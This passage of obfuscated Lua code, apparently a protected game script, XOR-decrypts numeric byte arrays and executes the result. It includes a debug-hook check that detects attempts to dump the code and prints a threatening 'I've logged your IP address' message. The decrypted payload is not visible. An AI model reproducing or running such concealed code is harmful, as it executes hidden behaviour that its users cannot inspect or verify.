                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD[ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('F2') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('3D') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('DF') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('2A')](t) then
                    iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD
                        [ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('F2') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('3D') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('DF') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('2A')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; gfdlqEelUC9p4XXZQ7PXZoPNs9X3l85osZh6na9QRW8mPAYpWGOijBayVuZwRymwOtRtVkE(
{ 1036, 874, 794, 1179, 548, 730, 1008, 961, 860, 659, 718, 715, 688, 611, 876, 1052, 847, 679, 693, 812, 1145, 857, 893,
  690, 905, 1071, 1142, 726, 668, 820, 692, 618, 934, 930, 1117, 1013, 810, 1103, 918, 566, 909, 1192, 572, 1045, 1100,
  561, 744, 1186, 1033, 706, 1027, 1065, 610, 702, 669, 865, 1095, 916, 1028, 1127, 552, 608, 781, 822, 784, 741, 1073,
  908, 600, 662, 920, 639, 839, 1000, 687, 758, 967, 992, 658, 1043, 838, 709, 1006, 603, 796, 1202, 859, 1188, 1088,
  818, 1038, 885, 1130, 736, 1207, 638, 983, 589, 925, 1205, 689, 1056, 799, 830, 720, 1108, 1183, 729, 1147, 919, 1011,
  867, 979, 875, 770, 554, 677, 762, 765, 1024, 933, 579, 817, 1143, 621, 843, 771, 1055, 700, 630, 1181, 793, 766, 849,
  713, 791, 650, 678, 584, 969, 743, 1102, 785, 1196, 954, 750, 1203, 1068, 802, 1135, 1001, 1171, 1152, 900, 923, 1170,
  870, 1129, 1144, 982, 914, 675, 747, 991, 1101, 889, 1029, 944, 964, 725, 707, 648, 970, 915, 602, 994, 806, 842, 740,
  1160, 597, 635, 551, 673, 974, 897, 1193, 717, 827, 705, 1086, 1020, 949, 637, 1111, 653, 749, 864, 1005, 924, 1199,
  986, 890, 809, 578, 814, 563, 576, 990, 1177, 935, 1026, 587, 1077, 555, 816, 835, 790, 1054, 719, 1176, 932, 712, 998,
  999, 910, 1064, 657, 590, 1140, 813, 1154, 716, 1040, 1097, 666, 901, 1003, 1075, 1133, 881, 832, 559, 1009, 971, 564,
  628, 997, 931, 694, 800, 681, 670, 1211, 775, 605, 1200, 1112, 575, 904, 604, 833, 1114, 580, 1099, 1161, 1121, 1012,
  1134, 646, 1106, 1169, 907, 703, 1187, 788, 960, 1062, 808, 1159, 887, 929, 1049, 1166, 1163, 984, 571, 557, 768, 1039,
  1118, 973, 1157, 739, 936, 599, 831, 1031, 1194, 828, 1168, 951, 634, 939, 776, 1025, 978, 667, 574, 745, 801, 1184,
  737, 852, 1151, 1156, 774, 633, 582, 698, 1044, 546, 761, 722, 1014, 1002, 1016, 627, 686, 879, 912, 547, 553, 940,
  1048, 588, 746, 958, 1091, 995, 903, 926, 649, 981, 902, 696, 1066, 581, 764, 797, 868, 869, 1155, 652, 622, 886, 655,
  1098, 861, 1210, 877, 950, 573, 959, 1060, 570, 1057, 632, 748, 1017, 727, 697, 1034, 1015, 733, 731, 601, 676, 565,
  1132, 884, 724, 760, 871, 1148, 625, 1007, 898, 1023, 1093, 1206, 714, 755, 1050, 545, 1174, 975, 651, 1109, 645, 993,
  695, 664, 1195, 1051, 631, 617, 1113, 1010, 826, 1139, 1059, 1209, 723, 966, 1082, 710, 952, 1018, 1061, 640, 1146,
  977, 586, 759, 1089, 1189, 1185, 615, 1021, 942, 980, 683, 811, 594, 701, 556, 1175, 803, 647, 1067, 665, 946, 850,
  862, 792, 644, 1058, 728, 1094, 756, 805, 913, 837, 963, 856, 988, 754, 596, 1116, 1107, 598, 614, 684, 1164, 656,
  1047, 851, 840, 609, 866, 863, 906, 927, 819, 680, 891, 787, 815, 972, 549, 1173, 1105, 882, 855, 947, 606, 1126, 1137,
  642, 880, 1128, 1074, 1180, 626, 778, 1104, 585, 753, 938, 943, 844, 550, 1076, 1032, 917, 558, 899, 752, 834, 1198,
  1092, 643, 641, 779, 928, 620, 786, 1150, 1136, 1080, 636, 846, 1004, 1030, 777, 878, 1070, 660, 1167, 708, 595, 873,
  1190, 955, 892, 829, 948, 1191, 1178, 1120, 780, -1, 82, 229, 103, 61, 77, 33, 105, 109, 70, 36, 97, 44, 104, 97, 73,
  105, 62, 138, 69, 27, 1, 39, 80, 97, 38, 96, 69, 92, 9, 23, 80, 31, 80, 66, 222, 27, 126, 32, 61, 118, 123, 59, 41,
  112, 116, 16, 74, 51, 208, 213, 111, 73, 27, 82, 20, 8, 118, 23, 105, 78, 33, 19, 28, 13, 42, 54, 16, 65, 36, 14, 220,
  51, 105, 183, 67, 60, 14, 82, 104, 23, 210, 121, 22, 65, 126, 61, 102, 123, 54, 122, 58, 89, 93, 25, 104, 111, 9, 103,
  14, 89, 65, 51, 61, 43, 84, 102, 63, 118, 112, 119, 114, 27, 73, 73, 8, 17, 44, 106, 132, 32, 65, 115, 81, 77, 23, 11,
  69, 15, 224, 231, 11, 142, 123, 97, 59, 112, 48, 112, 108, 44, 83, 67, 209, 61, 16, 27, 77, 94, 200, 50, 73, 109, 59,
  36, 90, 112, 8, 87, 80, 76, 51, 67, 104, 92, 87, 48, 103, 14, 134, 80, 103, 77, 63, 94, 105, 1, 43, 65, 38, 43, 25, 99,
  109, 86, 125, 51, 33, 33, 111, 138, 85, 182, 19, 127, 77, 240, 112, 15, 41, 56, 28, 102, 85, 19, 108, 103, 72, 62, 62,
  28, 35, 59, 0, 42, 195, 28, 109, 73, 20, 40, 136, 27, 0, 10, 255, 90, 31, 6, 82, 163, 236, 63, 45, 29, 42, 25, 46, 29,
  18, 80, 25, 61, 105, 25, 120, 49, 175, 113, 37, 52, 95, 0, 44, 122, 69, 41, 93, 24, 65, 65, 88, 255, 118, 102, 215, 12,
  94, 23, 38, 80, 88, 23, 85, 119, 65, 35, 122, 111, 28, 111, 131, 77, 254, 69, 105, 97, 16, 30, 85, 53, 80, 56, 48, 101,
  39, 31, 36, 73, 77, 74, 115, 112, 47, 69, 82, 108, 53, 23, 20, 25, 193, 87, 82, 51, 31, 135, 40, 5, 97, 69, 77, 112,
  36, 76, 53, 105, 97, 83, 77, 130, 110, 105, 120, 1, 23, 118, 99, 23, 47, 119, 111, 23, 97, 99, 110, 200, 127, 115, 109,
  112, 66, 104, 209, 130, 96, 16, 97, 23, 21, 122, 17, 4, 80, 103, 60, 36, 80, 99, 115, 73, 22, 96, 113, 47, 111, 67, 40,
  6, 239, 245, 31, 100, 49, 34, 110, 29, 30, 124, 0, 75, 23, 54, 73, 99, 229, 68, 32, 89, 123, 19, 122, 123, 118, 79, 45,
  106, 89, 16, 34, 51, 103, 17, 80, 120, 171, 24, 30, 94, 61, 81, 40, 110, 166, 19, 19, 72, 120, 14, 87, 111, 115, 92,
  52, 165, 122, 46, 40, 56, 58, 107, 73, 1, 192, 85, 46, 88, 138, 89, 119, 86, 13, 65, 25, 2, 53, 119, 23, 70, 102, 51,
  21, 34, 27, 41, 69, 40, 112, 1, 40, 61, 59, 44, 120, 3, 105, 69, 133, 127, 97, 224, 95, 35, 4, 96, 19, 57, 70, 41, 57,
  85, 88, 109, 149, 107, 29, 37, 46, 57, 173, 52, 85, 37, 32, 241, 71, 23, 82, 53, 29, 34, 216, 85, 94, 16, 69, 60, 87,
  5, 103, 47, 230, 57, 8, 37, 86, 48, 215, 112, 5, 68, 25, 19, 34, 120, 127, 151, 154, 65, 10, 21, 206, 132, 113, 120,
  184, 16, 120, 103, 7, 39, 20, 62, 53, 43, 21, 77, 105, 11, 97, 33, 102, 0, 80, 16, 29, 94, 57, 196, 123, 85, 32, 11,
  39, 55, 109, 35, 176, 47, 53, 24, 49, 52, 94, 103, 59, 16, 12, 77, 197, 119, 63, 98, 22, 81, 97, 222, 99, 31, 175, 8,
  74, 66, 97, 110, 103, 39, 81, 57, 17, 3, 55, 66, 80, 34, 120, 131, 30, 1, 45, 76, 29, 85, 151, 68, 31, 22, 44, 86, 72,
  47, 97, 39, 26, 38, 30, 8, 53, 81, 107, 100, 12, 3, 111, 21, 21, 43, 85, 109, 99, 119, 107, 101, 38, 49, 17, 86, 88,
  68, 179, 34, 69, 255, 21, 21, 16, 53, 21, 89, 4, 27 }, "a9eGGNZPMXuOIApW7CimAy703q"); bINMlMi8ZFdYW9cT4zWadM3cD6BDLb3Y7AfOsAz6lFV8eXilW4V3mK3cEM =
iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD; oE8069iA1bjzErxx2rr4TTWNt9P9ZLCGi4rt5IVxmjgIBjP8KQY7YzsJh5ZEm =
iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD; fneUHSsIyTLuVFkiojIUpXfwP31V8B21ca1wCMfYLRYlUScXrGrG1hkCc4MLcdWoNavnLS =
oE8069iA1bjzErxx2rr4TTWNt9P9ZLCGi4rt5IVxmjgIBjP8KQY7YzsJh5ZEm; qz2ihzOXqsQStmO7ra052IGSfr9F6XNMdUY9LTtOBoausVDOK1hwTHJffXFlr3pvSqIV74LUb =
fneUHSsIyTLuVFkiojIUpXfwP31V8B21ca1wCMfYLRYlUScXrGrG1hkCc4MLcdWoNavnLS; fke22E1AKEbfgHWjT0ccOyqptczKFcUUw1M5WlaXGoEkggKv8C9GdpOvcxeF1F4MG2QZC2P =
qz2ihzOXqsQStmO7ra052IGSfr9F6XNMdUY9LTtOBoausVDOK1hwTHJffXFlr3pvSqIV74LUb; aZux74jfbvH384vXck84xQ4p0N29L8E3hEjg5ry08Iv9wnGD4ZVzv4AISI1yu93paWQFYc =
fke22E1AKEbfgHWjT0ccOyqptczKFcUUw1M5WlaXGoEkggKv8C9GdpOvcxeF1F4MG2QZC2P; rrXcisxDQvQTYHyvKUigfXcF1dF8JG3zEJDMJlzNuGR63AjG6XJPWa4H1m =
aZux74jfbvH384vXck84xQ4p0N29L8E3hEjg5ry08Iv9wnGD4ZVzv4AISI1yu93paWQFYc; yIrQ8am3EpclzJyOdmW59dD8Mw9NSiYE6j72eJ054WOeVUMYIcdED7ze4m1W0uPJMgnFOEanJ9r =
rrXcisxDQvQTYHyvKUigfXcF1dF8JG3zEJDMJlzNuGR63AjG6XJPWa4H1m; eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk =
yIrQ8am3EpclzJyOdmW59dD8Mw9NSiYE6j72eJ054WOeVUMYIcdED7ze4m1W0uPJMgnFOEanJ9r; ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n = function(
  a)
  K, F = 1466621535858471, 16384 + 7328; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; bJrjH7wpnjULerDQ1dCao8hODQRuUXTbOo5LGrI3jbQxlhrrHFSfsVd = function(b)
  co = coroutine.create(b)
  vGVgso6XYyPNwaTZZQvzlS4kp4xhaZXoGMzaWbHXYfHss3VLSvrBotwkZUcYIs9xf6s = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(vGVgso6XYyPNwaTZZQvzlS4kp4xhaZXoGMzaWbHXYfHss3VLSvrBotwkZUcYIs9xf6s, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return vGVgso6XYyPNwaTZZQvzlS4kp4xhaZXoGMzaWbHXYfHss3VLSvrBotwkZUcYIs9xf6s
end; nDU5PJlVaiSSh0u7fHMkzU2C7LXnZfPSeyc4BB8UQRlG27hGiGTxz = function(f, g)
  vX3vxngf1z9Cf3mUnCkML18ztNndo1PjesukqJUdldfLAU66DElqW = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; sxi525BVnmwexAIZISmwOv2q2FnPGvnMmXnw4BoqWFjDudJ2Abw0sizpDcVYkvYFwzX0nblf = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; fs0YTN0RYayjhTXdFmJnReb9tYb7D6ZPK25coe8d3izcGqQdiaP = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      vX3vxngf1z9Cf3mUnCkML18ztNndo1PjesukqJUdldfLAU66DElqW(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; mFWYA5sSeUMwiQuxFoKOfUExArMGlnJoPiqnfOS2RC2Oh9ipUEUE8BtLf4c1qPPMiaW = function(p, n)
    gQy317vOx2I5aqtVXnX2Zd38VsEBUwzM12Y9dJjP1KxubSvMBLNerRjUnYWa7s7rpuXc5EO = ""
    for k, q in pairs(p) do gQy317vOx2I5aqtVXnX2Zd38VsEBUwzM12Y9dJjP1KxubSvMBLNerRjUnYWa7s7rpuXc5EO =
      gQy317vOx2I5aqtVXnX2Zd38VsEBUwzM12Y9dJjP1KxubSvMBLNerRjUnYWa7s7rpuXc5EO ..
      eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk
      [ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('54') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('A3') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('05') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('3E') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('C9') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('A0')]
      [ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('64') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('EF') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('C6') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('05')](
      q) end
    ; n(gQy317vOx2I5aqtVXnX2Zd38VsEBUwzM12Y9dJjP1KxubSvMBLNerRjUnYWa7s7rpuXc5EO)
  end; sxi525BVnmwexAIZISmwOv2q2FnPGvnMmXnw4BoqWFjDudJ2Abw0sizpDcVYkvYFwzX0nblf(f,
    function(r) fs0YTN0RYayjhTXdFmJnReb9tYb7D6ZPK25coe8d3izcGqQdiaP(r, g,
        function(s) mFWYA5sSeUMwiQuxFoKOfUExArMGlnJoPiqnfOS2RC2Oh9ipUEUE8BtLf4c1qPPMiaW(s,
            function(t) if #bJrjH7wpnjULerDQ1dCao8hODQRuUXTbOo5LGrI3jbQxlhrrHFSfsVd(eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk[ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('2B') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('18') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('C6') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('B3')]) == 1 then if eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk[ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('2B') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('18') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('C6') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('B3')] == eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk[ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('67') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('05') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('3E') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('C9') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('A3')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk[ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('2B') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('18') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('C6') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('B3')](t) then
                    eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk
                        [ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('2B') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('18') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('C6') .. ll6wHqbUzrhCmI6is5WEwvbRkqFVvAK3KryMNBE2KyNIOfGq2h5n('B3')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; nDU5PJlVaiSSh0u7fHMkzU2C7LXnZfPSeyc4BB8UQRlG27hGiGTxz(
{ 984, 1000, 1115, 964, 851, 621, 818, 1212, 552, 1158, 1039, 1063, 655, 700, 1054, 963, 1030, 1051, 939, 838, 668, 1159,
  589, 1014, 1012, 965, 636, 878, 720, 1049, 723, 875, 794, 1204, 1132, 577, 740, 807, 945, 1120, 873, 1181, 874, 1095,
  578, 729, 782, 1141, 712, 881, 1114, 1087, 1084, 733, 1027, 570, 844, 610, 676, 584, 1169, 1024, 609, 666, 931, 876,
  896, 827, 566, 934, 996, 1052, 845, 1116, 561, 756, 884, 1101, 1129, 918, 1170, 928, 708, 1088, 1119, 835, 806, 1096,
  899, 812, 1020, 747, 948, 763, 856, 1149, 620, 641, 901, 775, 1017, 1013, 1073, 862, 1113, 784, 1126, 1035, 717, 789,
  601, 607, 1118, 707, 975, 1143, 1065, 1207, 810, 889, 730, 728, 1037, 1072, 893, 581, 1148, 887, 842, 954, 608, 741,
  1048, 919, 1058, 980, 658, 650, 686, 786, 565, 924, 640, 1205, 1110, 1023, 1123, 1154, 1201, 1008, 852, 685, 1193, 634,
  888, 696, 1011, 828, 544, 1165, 693, 914, 859, 710, 861, 1183, 691, 1125, 731, 944, 791, 602, 855, 736, 894, 635, 1197,
  692, 951, 585, 1043, 892, 749, 560, 1104, 849, 1031, 955, 779, 1117, 797, 1056, 909, 836, 853, 1133, 926, 1187, 647,
  1198, 1194, 904, 1097, 673, 551, 586, 716, 595, 582, 795, 752, 935, 917, 900, 1040, 1028, 829, 1029, 1090, 697, 677,
  754, 1041, 907, 605, 1021, 1100, 953, 1111, 902, 556, 737, 821, 739, 660, 764, 689, 698, 1010, 1074, 702, 1057, 895,
  727, 721, 550, 590, 1046, 642, 643, 1108, 867, 1156, 956, 949, 1142, 905, 841, 936, 854, 1195, 771, 819, 804, 705,
  1026, 1007, 1151, 748, 680, 868, 639, 713, 653, 587, 683, 961, 916, 593, 667, 969, 1179, 758, 629, 738, 913, 1004, 664,
  974, 923, 568, 1109, 638, 622, 1059, 1160, 567, 1153, 847, 793, 599, 644, 709, 1092, 619, 846, 1045, 903, 1079, 612,
  706, 711, 946, 743, 780, 1082, 925, 630, 865, 1064, 615, 679, 1001, 603, 830, 987, 831, 773, 769, 1172, 1182, 774, 637,
  906, 627, 864, 1033, 772, 604, 1157, 1135, 886, 654, 1122, 1177, 671, 1034, 1042, 724, 933, 1112, 994, 1016, 848, 787,
  596, 1009, 910, 1018, 765, 1206, 557, 1093, 790, 690, 574, 989, 1167, 823, 988, 1066, 798, 1025, 1106, 767, 1083, 555,
  815, 753, 860, 811, 999, 1190, 554, 688, 824, 991, 1202, 1155, 1077, 746, 1191, 694, 665, 973, 799, 726, 631, 656, 929,
  1036, 652, 562, 722, 801, 979, 1062, 670, 719, 768, 750, 1175, 672, 1103, 885, 678, 941, 950, 1166, 802, 675, 624, 563,
  776, 597, 646, 971, 817, 734, 598, 785, 742, 1184, 967, 662, 1208, 1069, 993, 915, 1203, 549, 777, 1180, 1005, 580,
  546, 548, 744, 1075, 588, 952, 651, 995, 1081, 1078, 572, 982, 796, 674, 600, 591, 1099, 1161, 770, 972, 843, 559,
  1134, 735, 1200, 882, 617, 1144, 1185, 1060, 778, 1127, 1032, 883, 1067, 826, 1192, 839, 1162, 1003, 911, 1105, 1145,
  922, 576, 966, 632, 976, 1019, 877, 912, 981, 891, 800, 611, 834, 553, 762, 958, 803, 1131, 1209, 759, 663, 921, 751,
  942, 783, 1098, 681, 1061, 920, 850, 1176, 701, 1080, 1015, 959, 1188, 1140, 1138, 687, 625, 614, 857, 725, 998, 1053,
  932, 718, 1044, 879, 978, 1038, 880, 1002, 1178, -1, 47, 112, 148, 24, 172, 29, 93, 41, 85, 6, 112, 121, 74, 22, 75,
  240, 76, 93, 94, 80, 109, 150, 60, 25, 117, 13, 167, 8, 244, 54, 165, 10, 15, 70, 12, 45, 196, 119, 108, 78, 141, 59,
  90, 76, 19, 62, 12, 30, 59, 89, 42, 39, 124, 121, 110, 100, 16, 45, 63, 5, 37, 16, 25, 243, 53, 124, 50, 43, 64, 14,
  170, 105, 38, 202, 97, 49, 59, 111, 37, 112, 209, 106, 112, 20, 89, 111, 31, 62, 112, 75, 182, 76, 117, 31, 71, 111,
  34, 74, 126, 6, 14, 65, 200, 79, 21, 249, 25, 112, 65, 53, 54, 17, 56, 58, 150, 97, 158, 2, 107, 111, 26, 31, 25, 97,
  42, 71, 192, 58, 36, 91, 65, 92, 73, 46, 5, 43, 10, 28, 8, 53, 82, 73, 87, 56, 97, 1, 39, 18, 102, 85, 78, 50, 73, 104,
